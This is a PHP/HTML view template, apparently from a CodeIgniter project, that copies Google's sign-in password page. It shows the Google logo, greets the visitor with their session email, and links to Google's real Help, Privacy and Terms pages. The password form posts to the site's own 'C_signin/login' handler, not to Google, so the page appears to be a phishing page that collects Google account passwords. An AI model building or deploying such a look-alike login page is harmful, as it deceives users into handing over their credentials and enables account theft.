
<html>
<head>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
<body>
    <div class="container" style="margin-top: 178px">
    <div class="card " style="width: 448px;height: 520px; border-radius: 8px;border-width: 2px;font-family: font-family: roboto;margin: auto">
    <form action="<?php echo base_url('C_signin/login') ?>" method="post" class="card-body" style="margin: 17px">
        <div class="text-center" style="margin-top: 20px"><img style="width: 101px; height: 74px;" src="http://logosvg.com/wp-content/uploads/2016/08/Google_logo-1.png"></div>
        <div class="text-center" style="font-size: 24px">Welcome</div>
        <div class="text-center border rounded-pill" style="font-size: 16px;margin-left: 30px; margin-right: 30px"><?php echo $this->session->userdata('email');?></div>
         <div class="form-group" style="margin-top: 30px">
            <input style="height: 54px" type="password" class="form-control" name="pass" placeholder="Enter your password">
            
        </div>        
            <div style="margin-top: 50px;">
                 <a href="" class="font-weight-bold" style=""> Forgot password</a>  
                <button type="submit" class="btn btn-primary float-right" style="width: 92px">Next</button>
            </div>
                
        </form>
    </div>
       <div style="margin: auto;width: 448px; font-family: font-family: roboto; margin-top: 20px;font-size: 12px"> 
        <div class="row">
            <div class="col-sm-7 dropdown-toggle">English (United States)</div>
            <a class="col text-muted font-weight-bold" href = "https://support.google.com/accounts?hl=en#topic=3382296" target="_blank">Help</a>
            <a class="col text-muted font-weight-bold" href="https://policies.google.com/privacy?gl=ID&hl=en" target="_blank">Privacy</a>
            <a class="col text-muted font-weight-bold" href="https://policies.google.com/terms?gl=ID&hl=en" target="_blank">Terms</a>
        </div>
    </div>
    </div> 
    
</body>
</html>